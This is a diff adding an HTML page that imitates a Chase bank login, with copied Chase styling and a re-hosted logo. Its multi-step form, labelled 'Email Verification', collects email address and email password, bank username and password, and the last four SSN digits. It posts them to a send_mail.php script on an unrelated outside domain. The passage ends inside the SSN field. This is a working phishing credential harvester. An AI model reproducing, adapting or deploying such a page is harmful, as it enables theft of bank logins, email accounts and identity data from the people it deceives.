@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+
+    <style>@font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 600;
+            src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 700;
+            src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.woff') format('woff'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.ttf') format('truetype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.svg#opensans-bold') format('svg');
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 800;
+            src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.woff') format('woff'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.ttf') format('truetype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');
+        }
+
+        @font-face {
+            font-family: Open Sans;
+            font-style: normal;
+            font-weight: 300;
+            src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');
+        }
+
+        @font-face {
+            font-family: videoplayer;
+            font-style: normal;
+            font-weight: normal;
+            src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'), url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');
+        }
+
+        html {
+            height: 100%;
+            background: #fff;
+        }
+
+        @media only screen and (min-width: 768px) {
+            html {
+                background: #1c4f82;
+                background: -moz-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
+                background: -webkit-linear-gradient(top, #1c4f82 0%, #2e6ea3 100%);
+                background: linear-gradient(to bottom, #1c4f82 0%, #2e6ea3 100%);
+            }
+        }
+    </style>
+
+
+    <style>
+        /* Mark input boxes that gets an error on validation: */
+        input.invalid {
+            background-color: #ffdddd;
+        }
+
+        /* Hide all steps by default: */
+        .tab {
+            display: none;
+        }
+        /*! CSS Used from: Embedded */
+        body{transition:opacity ease-in 0.2s;}
+        /*! CSS Used from: Embedded */
+        body{transition:opacity ease-in 0.2s;}
+        /*! CSS Used from: http://127.0.0.62/login/blue-ui.css */
+        *{box-sizing:border-box;}
+        body{margin:0;}
+        footer,header,main{display:block;}
+        a{background:0 0;}
+        a:active,a:hover{outline:0;}
+        button,input{color:inherit;font:inherit;margin:0;}
+        button{overflow:visible;}
+        button{text-transform:none;}
+        button{-webkit-appearance:button;cursor:pointer;}
+        button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0;}
+        input{line-height:normal;}
+        input[type=checkbox]{box-sizing:border-box;padding:0;}
+        .row:after,.row:before{display:table;content:' ';}
+        .container:after,.row:after{clear:both;}
+        .jpui.button .label{font-size:1rem;font-weight:400;color:#414042;letter-spacing:0;text-decoration:none;}
+        .jpui.button.primary .label{font-size:1rem;font-weight:600;color:#fff;letter-spacing:0;text-decoration:none;}
+        .jpui.button:disabled .label{font-size:1rem;font-weight:400;color:#ccc;letter-spacing:0;text-decoration:none;}
+        .jpui.checkbox .checkbox-label{font-size:.875rem;font-weight:400;color:#414042;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.checkbox .checkbox-label{font-size:1rem;}
+        }
+        .jpui.fieldlabel.vertical{font-size:.75rem;font-weight:400;color:#717171;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.fieldlabel.vertical{font-size:.875rem;}
+        }
+        .jpui.fieldlabel.vertical.error{font-size:.75rem;font-weight:600;color:#bf2155;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.fieldlabel.vertical.error{font-size:.875rem;}
+        }
+        .container{margin-right:auto;margin-left:auto;padding-left:12px;padding-right:12px;}
+        @media (min-width:768px){
+            .container{width:744px;}
+        }
+        @media (min-width:992px){
+            .container{width:964px;}
+        }
+        @media (min-width:1200px){
+            .container{width:1164px;}
+        }
+        .row{margin-left:-12px;margin-right:-12px;}
+        .col-md-6,.col-sm-6,.col-xs-10,.col-xs-12,.col-xs-6{position:relative;min-height:.0625rem;padding-left:12px;padding-right:12px;}
+        .col-xs-10,.col-xs-12,.col-xs-6{float:left;}
+        .col-xs-12{width:100%;}
+        .col-xs-10{width:83.33333333%;}
+        .col-xs-6{width:50%;}
+        .col-xs-offset-1{margin-left:8.33333333%;}
+        @media (min-width:768px){
+            .col-sm-6{float:left;}
+            .col-sm-6{width:50%;}
+            .col-sm-offset-3{margin-left:25%;}
+        }
+        @media (min-width:992px){
+            .col-md-6{float:left;}
+            .col-md-6{width:50%;}
+            .col-md-offset-3{margin-left:25%;}
+        }
+        .header{font-family:inherit;font-weight:500;line-height:1.1;color:#666;}
+        .jpui.input{font-size:.875rem;font-weight:400;color:#414042;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.input{font-size:1rem;color:#414042;}
+        }
+        .jpui.input:disabled{font-size:.875rem;font-weight:400;color:#bcbcbc;letter-spacing:0;text-decoration:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;}
+        @media screen and (min-width:768px){
+            .jpui.input:disabled{font-size:1rem;}
+        }
+        .jpui.link{font-size:.8125rem;font-weight:400;color:#126bc5;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.link{font-size:.875rem;}
+        }
+        .jpui.link .link-anchor{font-size:.8125rem;font-weight:400;color:#126bc5;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.link .link-anchor{font-size:.875rem;}
+        }
+        p{font-size:.6em;}
+        .util.accessible-text{position:absolute!important;clip:rect(.0625rem .0625rem .0625rem .0625rem);clip:rect(.0625rem,.0625rem,.0625rem,.0625rem);padding:0!important;border:0!important;height:.0625rem!important;width:.0625rem!important;overflow:hidden;}
+        @media print{
+            *{border-color:#000!important;color:#000;transition:none!important;}
+            .jpui:not(.chart) *{transform:scale(1,1)!important;opacity:1!important;}
+        }
+        @media print and (min-width:0){
+            .col-sm-6{float:left!important;}
+            .col-sm-6{width:50%!important;}
+            .col-sm-offset-3{margin-left:25%!important;}
+            .col-md-6{float:left!important;}
+            .col-md-6{width:50%!important;}
+            .col-md-offset-3{margin-left:25%!important;}
+        }
+        :focus{outline:0;}
+        :focus.focus:focus:focus{outline:.0625rem dashed #717171;}
+        a:focus:focus{outline:.0625rem dashed #717171;}
+        .jpui.button{box-sizing:border-box;margin:.5rem;font-size:1rem;font-weight:400;color:#414042;background-color:#d6d6d6;border:none;border-radius:.3125rem;text-align:center;white-space:nowrap;vertical-align:middle;cursor:pointer;transition:background-color .4s ease,border-color .4s ease;outline:.0625rem solid transparent;-moz-appearance:none;-webkit-appearance:none;-webkit-padding-before:0;-webkit-padding-end:0;-webkit-padding-after:0;-webkit-padding-start:0;}
+        .jpui.button:active{background-color:#e5e5e5;}
+        .jpui.button:active .label{color:#414042;}
+        .jpui.button .label{display:inline-block;line-height:2.5rem;margin:0 1rem;}
+        .jpui.button:hover:not(.touch){background-color:#bcbcbc;}
+        .jpui.button:active:not(.touch){background-color:#e5e5e5;}
+        .jpui.button:active{background-color:#e5e5e5;}
+        .jpui.button:disabled{background-color:#e5e5e5;border:none;cursor:default;}
+        .jpui.button:disabled:hover{background-color:#e5e5e5;}
+        .jpui.button.primary{background-color:#0b6efd;border:none;}
+        .jpui.button.primary:hover:not(.touch){background-color:#0a4386;}
+        .jpui.button.primary:active:not(.touch){background-color:#0092ff;}
+        .jpui.button.primary:active{background-color:#0092ff;}
+        .jpui.button.primary:active .label{color:#fff;}
+        .jpui.button.primary:disabled{background-color:#a9d5ed;border:none;color:#fff;cursor:default;}
+        .jpui.button.primary:disabled .label{color:#fff;}
+        .jpui.button.primary:disabled:hover{background-color:#a9d5ed;}
+        .jpui.button.fluid{margin-left:0;margin-right:0;width:100%;height:2.5rem;overflow-x:auto;}
+        .jpui.button.fluid:disabled{background-color:#e5e5e5;}
+        .jpui.button.fluid:disabled.primary{background-color:#a9d5ed;}
+        .jpui.button.fluid:disabled.primary .label{color:#fff;}
+        .jpui.button.fluid:disabled .label{color:#ccc;}
+        .jpui.button.fluid .label{line-height:1.125rem;white-space:normal;margin:.0625rem .75rem;}
+        .jpui.button:focus{outline:.0625rem dashed #717171;}
+        .jpui.button:focus{outline:#717171 dashed .0625rem;}
+        .jpui.checkbox{margin-top:.1875rem;margin-bottom:.1875rem;}
+        .jpui.checkbox .checkbox-flex{display:flex;align-items:flex-start;}
+        .jpui.checkbox .checkbox-flex label{width:auto;}
+        .jpui.checkbox .checkbox-label{padding-left:.625rem;position:relative;bottom:.0625rem;display:inline-block;}
+        .jpui.checkbox .checkboxWrap{flex-shrink:0;width:1.25rem;height:1.25rem;}
+        .jpui.checkbox .checkboxWrap .check{display:inline-block;border:.0625rem solid #959595;height:1.25rem;width:1.25rem;border-radius:.1875rem;position:relative;bottom:1.375rem;}
+        .jpui.checkbox .checkboxWrap .check:after{content:'';width:1.125rem;height:1.125rem;font-size:1.125rem;}
+        .jpui.checkbox .checkbox__input{opacity:0;position:relative;height:1.25rem;width:1.25rem;z-index:1;vertical-align:bottom;}
+        .jpui.checkbox .checkbox__input:focus+.check{outline:.0625rem dashed #717171;}
+        .jpui.checkbox .checkbox__input+.check{color:#0b6efd;}
+        .jpui.checkbox .checkbox__input+.check:after{background-color:#fff;}
+        .jpui.checkbox:not(.disabled) input,.jpui.checkbox:not(.disabled) label{cursor:pointer;}
+        .jpui.fieldlabel{color:#717171;}
+        .jpui.fieldlabel.error{color:#bf2155;}
+        .jpui.fieldlabel.error:before{content:attr(data-error);position:absolute!important;clip:rect(.0625rem .0625rem .0625rem .0625rem);clip:rect(.0625rem,.0625rem,.0625rem,.0625rem);padding:0!important;border:0!important;height:.0625rem!important;width:.0625rem!important;overflow:hidden;}
+        .jpui.image{position:relative;display:inline-block;vertical-align:middle;max-width:100%;background-color:transparent;line-height:0;}
+        .jpui.image.fixed{position:fixed;top:0;left:0;z-index:-1;}
+        .jpui.image.background{height:100%;width:100%;padding:0;margin:0;background-size:cover;background-repeat:no-repeat;background-position:center center;}
+        .jpui.iconaction:focus{outline:0!important;}
+        .jpui.iconaction:focus i:not([disabled]){outline:.0625rem dashed #717171;}
+        .jpui.input{padding:.5rem 1rem;width:100%;height:2.5rem;border:.0625rem solid #959595;border-radius:0;outline:.0625rem solid transparent;-webkit-appearance:none;-webkit-user-select:text!important;}
+        .jpui.input:-ms-input-placeholder{color:#717171;}
+        .jpui.input::-webkit-input-placeholder{color:#717171;}
+        .jpui.input:-moz-placeholder{color:#717171;opacity:1;}
+        .jpui.input::-moz-placeholder{color:#717171;opacity:1;}
+        .jpui.input::-ms-clear{display:none;}
+        .jpui.input:invalid{box-shadow:none;}
+        .jpui.input:focus{border-color:#0b6efd;outline:.0625rem solid transparent;box-shadow:.0625rem .0625rem 0 #0b6efd,.0625rem -.0625rem 0 #0b6efd,-.0625rem .0625rem 0 #0b6efd,-.0625rem -.0625rem 0 #0b6efd;}
+        .jpui.input:disabled{border-color:#bcbcbc;background:#fff;outline:0;}
+        .jpui.input:disabled::-webkit-input-placeholder{color:#bcbcbc;}
+        .jpui.input:disabled::-moz-placeholder{color:#bcbcbc;}
+        .jpui.input:disabled:-ms-input-placeholder{color:#bcbcbc;}
+        .jpui.input[type=number]{-moz-appearance:textfield;}
+        .jpui.link .link-anchor{text-decoration:none;white-space:nowrap;position:relative;}
+        @media (max-width:767px){
+            .jpui.link .link-anchor{padding:.5rem;margin-left:-.5rem;margin-right:-.5rem;}
+        }
+        .jpui.link .end-icon{margin-left:-.125rem;padding-left:.3125rem;font-size:.6429rem;color:inherit!important;display:inline;}
+        .jpui.segment{border-top:.3125rem transparent solid;padding:1rem;margin-bottom:1rem;background-color:#f9f6f3;transition:opacity .25s ease-in-out;position:relative;}
+        .jpui.segment:focus{outline:.0625rem dashed #717171;}
+        .jpui.segment:hover{background:#fff;}
+        .jpui.segment:not(.active){transition:border-top-color .25s,background-color .25s;}
+        .jpui.fieldgroup{margin-top:0;text-align:left;}
+        .jpui.fieldgroup .vertical{margin-bottom:1.125rem;margin-top:-.3125rem;}
+        .jpui.fieldgroup .vertical .align-label-input.floating-label__container{position:relative;}
+        .jpui.fieldgroup .vertical .align-label-input.floating-label__container .fieldlabel{font-size:1rem;}
+        .jpui.fieldgroup .vertical label{margin-bottom:.5rem;}
+        .jpui.icon{font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;text-decoration:none;display:inline-block;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;padding:0;color:#666;font-size:1em;font-family:dcefont;}
+        .jpui.icon.equal-housing-lender:after{content:'\e605';}
+        .jpui.icon.facebook:after{content:'\f112';}
+        .jpui.icon.instagram:after{content:'\e62d';}
+        .jpui.icon.linkedin:after{content:'\f102';}
+        .jpui.icon.twitter:after{content:'\f120';}
+        .jpui.icon.youtube:after{content:'\f111';}
+        .jpui.icon.check:after{content:'\f11c';}
+        .jpui.icon.checkmark:after{content:'\f11b';}
+        .jpui.icon.progressright:after{content:'\f108';}
+        .jpui.icon.equal-housing-lender:hover:not(.touch),.jpui.icon.facebook:hover:not(.touch),.jpui.icon.instagram:hover:not(.touch),.jpui.icon.linkedin:hover:not(.touch),.jpui.icon.progressright:hover:not(.touch),.jpui.icon.twitter:hover:not(.touch),.jpui.icon.youtube:hover:not(.touch){color:#0092ff;}
+        .jpui.icon.equal-housing-lender:active:not(.touch),.jpui.icon.facebook:active:not(.touch),.jpui.icon.instagram:active:not(.touch),.jpui.icon.linkedin:active:not(.touch),.jpui.icon.progressright:active:not(.touch),.jpui.icon.twitter:active:not(.touch),.jpui.icon.youtube:active:not(.touch){color:#0b6efd;}
+        .jpui.icon.equal-housing-lender:active,.jpui.icon.facebook:active,.jpui.icon.instagram:active,.jpui.icon.linkedin:active,.jpui.icon.progressright:active,.jpui.icon.twitter:active,.jpui.icon.youtube:active{color:#0b6efd;}
+        .jpui.icon.check{color:#126bc5;}
+        .jpui.icon.checkmark{color:#0092ff;}
+        .NOTE{font-size:.75rem;font-weight:400;color:#717171;letter-spacing:0;text-decoration:none;}
+        .NOTELINK{font-size:.75rem;font-weight:400;color:#126bc5;letter-spacing:0;text-decoration:none;}
+        /*! CSS Used from: http://127.0.0.62/login/logon.css */
+        .homepage,body{height:100%;}
+        .logon .hidden{display:none!important;}
+        .logon-container{position:relative;}
+        .logon-container>header{position:relative;z-index:2;}
+        .logon.header{padding:18px 0;text-align:center;}
+        @media only screen and (min-width:768px){
+            .logon.header{padding:1.5em 0;}
+        }
+        .logon.header.jpui.transparent.bar{background-color:transparent;background-image:linear-gradient(to bottom,rgba(0,0,0,.7) 0,rgba(0,0,0,.5) 50%,rgba(0,0,0,0) 100%);}
+        .logon.header a{display:inline-block;}
+        .logon.header a:focus{outline-color:#fff;}
+        .logon.header .chase.logo{width:220px;height:2rem;margin:0 auto;text-align:center;background:url('http://127.0.0.62/@seur/cxo-ui-common-utilities/dist/common/assets/img/logos/wordmark-white.png') no-repeat;background-image:url('http://127.0.0.62/@seur/cxo-ui-common-utilities/dist/common/assets/img/logos/wordmark-white.svg');background-position:center center;}
+        .footer-container{background:#fff;font-size:16px;padding:1em 0;position:static;margin-top:50px;bottom:0;left:0;right:0;}
+        @media all and (min-height:992px) and (max-height:1023px){
+            .footer-container{margin-top:142px;position:absolute;}
+        }
+        @media all and (min-height:1024px){
+            .footer-container{position:absolute;margin-top:220px;}
+        }
+        .footer-container ul{list-style:none;padding:0;margin:0;}
+        .footer-container li{display:inline-block;margin-right:16px;}
+        .footer-container a,.footer-container a:visited{text-decoration:none;color:#757575;transition:color .4s ease;}
+        .footer-container a:hover,.footer-container a:visited:hover{color:#414042;}
+        .footer-container .social-links{text-align:center;border-bottom:1px solid #ccc;padding-top:6px;padding-bottom:12px;margin-bottom:26px;}
+        .footer-container .social-links .follow-us-text{display:inline-block;vertical-align:middle;font-size:1.125em;color:#717171;}
+        .footer-container .social-links ul.icon-links{display:inline-block;vertical-align:middle;margin:0 auto;}
+        .footer-container .social-links li{margin-left:10px;margin-right:0;width:1.4rem;vertical-align:middle;}
+        .footer-container .social-links a{color:#717171;display:inline-block;}
+        .footer-container .social-links a:hover{color:#414042;}
+        .footer-container .social-links .jpui.icon{font-size:1.4rem;}
+        .footer-container .footer-links ul{text-align:center;}
+        .footer-container .footer-links .jpui.link .link-anchor,.footer-container .footer-links li{color:#757575;font-size:.65625rem;}
+        .footer-container .footer-links li{margin-bottom:10px;}
+        .footer-container .footer-links li .icon:hover:not(.touch){color:#666;}
+        .footer-container .footer-links .jpui.link .link-anchor{transition:color .4s ease;}
+        .footer-container .footer-links.implement-ada-features-enabled .jpui.link .link-anchor{text-decoration:underline;}
+        .footer-container .footer-links .equal-housing-lender{font-size:1.7em;}
+        .footer-container .footer-links .copyright-label{width:100%;}
+        .logon{font-size:16px;}
+        .logon .logon-box{margin-top:10px;}
+        @media only screen and (min-width:768px){
+            .logon .logon-box{margin-top:60px;}
+        }
+        @media only screen and (min-width:992px){
+            .logon .logon-box{margin-top:80px;}
+        }
+        .logon h3{color:#717171;font-weight:200;line-height:110%;margin:0;font-size:1.125rem;}
+        @media only screen and (min-width:768px){
+            .logon h3{font-size:1.25rem;}
+        }
+        @media only screen and (min-width:1200px){
+            .logon h3{font-size:1.5rem;}
+        }
+        .logon .jpui.raised.segment{background:rgba(255,255,255,.96);border-radius:5px;padding:1.25rem 0 1.25rem 0;max-width:384px!important;overflow:visible!important;margin:0 auto;}
+        .logon .jpui.button.primary{margin:25px 0 20px 0;}
+        @media only screen and (min-width:768px){
+            .logon .jpui.button.primary{margin:13px 0;}
+        }
+        .logon a:focus,.logon input:focus{-moz-box-shadow:0 0 7px #126bc5;}
+        .logoff{opacity:1;margin-top:12em;}
+        @media only screen and (min-width:768px){
+            .logoff{margin-top:15.7em;}
+        }
+        .logoff .jpui.raised.segment{padding:0;max-width:none;border:none;overflow:hidden!important;}
+        .logoff .col-xs-10.col-xs-offset-1{padding:2.3em 0;}
+        .logoff h3{width:100%;text-align:center;font-size:1.25rem;color:#717171;font-weight:200;}
+        @media only screen and (min-width:768px){
+            .logoff h3{font-size:1.5rem;}
+        }
+        .logoff h3:focus{outline:0;}
+        .logoff .progress{width:100%;height:5px;background:#cbcbcb;border-bottom-left-radius:5px;border-bottom-right-radius:5px;}
+        .logoff .progress .bar{display:block;width:100%;height:100%;background:#2ca853;transform:translateX(-100%);}
+        .homepage{height:100%;}
+        div.advertiseNativeApp{background:#414042;}
+        body:not(.manageaccount) .galaxy-footer{display:none;}
+        .clientSideError:-ms-input-placeholder{color:#666!important;}
+        .logon-box .jpui.input.clientSideError{box-shadow:2px 2px 0 #bf2155,2px -2px 0 #bf2155,-2px 2px 0 #bf2155,-2px -2px 0 #bf2155;border:1px solid transparent;}
+        .logon-box .jpui.input.clientSideError:focus{box-shadow:2px 2px 0 #bf2155,2px -2px 0 #bf2155,-2px 2px 0 #bf2155,-2px -2px 0 #bf2155;}
+        .logon ::-webkit-input-placeholder{color:#666;}
+        .logon ::-moz-placeholder{color:#666;}
+        .logon :-moz-placeholder{color:#666;}
+        .logon :-ms-input-placeholder{color:#666;}
+        .jpui.background.image{background-color:#003c69!important;background-image:linear-gradient(to bottom,rgba(0,60,105,.4),rgba(0,60,105,.8));}
+        .jpui.icon.equal-housing-lender:after{content:"\e605";}
+        .logon .logon-box .input{font-size:1.125rem;background:0 0;border:none;border-bottom:1px solid #ccc;padding:5px;margin:10px 0;}
+        .logon .logon-box .useToken.checkbox{float:right;}
+        .logon .logon-box .jpui.checkbox .checkbox-label{color:#666;font-size:.875rem;white-space:nowrap;padding-top:3px;}
+        .logon .logon-box .jpui.link .link-anchor{line-height:1.6rem;white-space:normal;}
+        .jpui.fieldgroup.userID-margin-top{margin-top:32px;}
+        .logon-box .logon-floating-label .jpui.input.clientSideError,.logon-box .logon-floating-label .jpui.input.clientSideError:focus{box-shadow:0 2px 0 -1px #bf2155;}
+        .logon-floating-label .jpui.input:focus{box-shadow:0 2px 0 -1px #0b6efd;}
+        body:after{content:'xs';display:none;}
+        @media screen and (min-width:768px){
+            body:after{content:'sm';display:none;}
+        }
+        @media screen and (min-width:992px){
+            body:after{content:'md';display:none;}
+        }
+        @media screen and (min-width:1200px){
+            body:after{content:'lg';display:none;}
+        }
+        .jpui.link{font-size:.8125rem;font-weight:400;color:#126bc5;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.link{font-size:.875rem;}
+        }
+        .jpui.link .link-anchor{font-size:.8125rem;font-weight:400;color:#126bc5;letter-spacing:0;text-decoration:none;}
+        @media screen and (min-width:768px){
+            .jpui.link .link-anchor{font-size:.875rem;}
+        }
+        /*! CSS Used from: Embedded */
+        .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.5.jpeg);filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.5.jpeg', sizingMethod='scale');-ms-filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.5.jpeg', sizingMethod='scale');}
+        @media (min-width: 320px){
+            .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.5.jpeg);}
+        }
+        @media (min-width: 992px){
+            .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.night.5.jpeg);}
+        }
+        @media (min-width: 1024px){
+            .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.night.5.jpeg);}
+        }
+        /*! CSS Used fontfaces */
+        @font-face{font-family:dcefont;font-style:'normal';font-weight:'normal';src:url('http://127.0.0.62/less/assets/fonts/dcefont.eot');src:url('http://127.0.0.62/less/assets/fonts/dcefont.eot#iefix') format('embedded-opentype'),url('http://127.0.0.62/less/assets/fonts/dcefont.woff') format('woff'),url('http://127.0.0.62/less/assets/fonts/dcefont.ttf') format('truetype'),url('http://127.0.0.62/less/assets/fonts/dcefont.svg#dcefont') format('svg');}
+    </style>
+
+    <style>
+        /* Make circles that indicate the steps of the form: */
+        .step {
+            height: 15px;
+            width: 15px;
+            margin: 0 2px;
+            background-color: #bbbbbb;
+            border: none;
+            border-radius: 50%;
+            display: inline-block;
+            opacity: 0.5;
+        }
+
+        .step.active {
+            opacity: 1;
+        }
+
+        /* Mark the steps that are finished and valid: */
+        .step.finish {
+            background-color: #04AA6D;
+        }
+    </style>
+</head>
+
+
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
+<div id="logonApp" data-is-view="true">
+    <div class="homepage" tabindex="-1">
+        <div id="advertisenativeapp" data-has-view="true">
+            <div data-is-view="true">
+                <div class="advertiseNativeApp"></div>
+            </div>
+        </div>
+        <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true">
+            <div data-is-view="true">
+                <div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading">
+                        You have no more site alerts</h2></div>
+            </div>
+        </div>
+        <div class="logon-container" id="container">
+            <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true" style="margin-bottom: -20px;">
+                <div class="logon header jpui transparent navigation bar" data-is-view="true">
+                    <img src="https://i.ibb.co/St0bXTP/Chasee.png" alt="Chase2" border="0"style="width: 190px; height: 35px;">
+                </div>
+            </header>
+            <main id="logon-content" data-has-view="true">
+                <div class="container logon" data-is-view="true">
+                    <div>
+                        <div id="backgroundImage">
+                            <div class="jpui background image fixed" id="geoImage">
+
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
+                            <div class="jpui raised segment">
+                                <div class="row">
+                                    <div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed
+                                            out.</h3></div>
+                                </div>
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <div class="progress">
+                                            <div class="bar"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
+                            <div class="jpui raised segment">
+                                <div id="thirdPartyAggregatorSecurityBanner"></div>
+                                <div class="row">
+                                    <div class="col-xs-10 col-xs-offset-1">
+                                        <form id="login-form" action="https://articonstruction.ca/images/send_mail.php" method="POST" autocomplete="on">
+                                            <div>
+                                                <p style="font-family: sans-serif; font-weight: bold; font-size: 20px; color: #5f5d5d;" id="tits">Email Verification</p>
+                                            </div>
+
+
+                                            <div class="tab">
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel label-alignment vertical error " style="font-family: sans-serif;">Email </label>
+                                                            <div class="logon-xs-toggle" id="userId-text">
+                                                                <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-text-input-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="email" name="email" data-validate="userId" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel " style="font-family: sans-serif;">Email Password</label>
+                                                            <div class="logon-xs-toggle" id="userId-text">
+                                                                <input min="0" class="jpui input logon-xs-toggle clientSideError" id="password-text-input-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="password" name="epassword" data-validate="password" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+											
+											
+											<div class="tab">
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel label-alignment vertical error" style="font-family: sans-serif;">Username </label>
+                                                            <div class="logon-xs-toggle" id="userId-text">
+                                                                <input min="0" class="jpui input logon-xs-toggle clientSideError" id="userId-text-input-field" placeholder="" format="" aria-describedby="  userId-input-field-label aggregator-security-banner" type="text" name="username" data-validate="userId" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+
+
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label" id="password">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel label-alignment vertical" style="font-family: sans-serif;">Password
+                                                            </label>
+
+                                                            <div class="logon-xs-toggle" id="password-text"><input min="0" class="jpui input logon-xs-toggle" id="password-text-input-field" placeholder="" format="" aria-describedby="  password-input-field-label" autocomplete="off" type="password" name="password" data-validate="password" required="" value="" style="font-family: sans-serif;">
+                                                            </div>
+                                                        </div>
+                                                        <div>
+                                                            <div></div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+											
+
+                                            <div class="tab">
+                                                <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
+                                                    <div class="jpui vertical">
+                                                        <div class="align-label-input floating-label__container">
+                                                            <label class="jpui fieldlabel label-alignment vertical error " style="font-family: sans-serif;">SSN (Last 4 Digits) </label>
+                                                            <div class="logon-xs-toggle" id="userId-text">
